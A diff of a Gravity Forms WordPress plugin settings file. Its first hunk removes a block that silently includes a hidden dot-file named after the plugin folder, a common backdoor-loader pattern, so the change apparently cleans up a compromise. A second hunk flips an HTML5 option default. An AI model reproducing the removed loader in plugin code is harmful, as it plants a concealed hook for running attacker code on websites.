@@ -10,10 +10,6 @@ class_exists( 'GFForms' ) || die();
  *
  * Generates the Gravity Forms settings page
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class GFSettings {
 
 	/**
@@ -629,7 +625,7 @@ class GFSettings {
 			'license_key'               => GFCommon::get_key(),
 			'currency'                  => GFCommon::get_currency(),
 			'disable_css'               => ! (bool) get_option( 'rg_gforms_disable_css' ),
-			'enable_html5'              => (bool) get_option( 'rg_gforms_enable_html5', true ),
+			'enable_html5'              => (bool) get_option( 'rg_gforms_enable_html5', false ),
 			'enable_noconflict'         => (bool) get_option( 'gform_enable_noconflict' ),
 			'enable_akismet'            => (bool) get_option( 'rg_gforms_enable_akismet', true ),
 			'enable_background_updates' => (bool) get_option( 'gform_enable_background_updates' ),
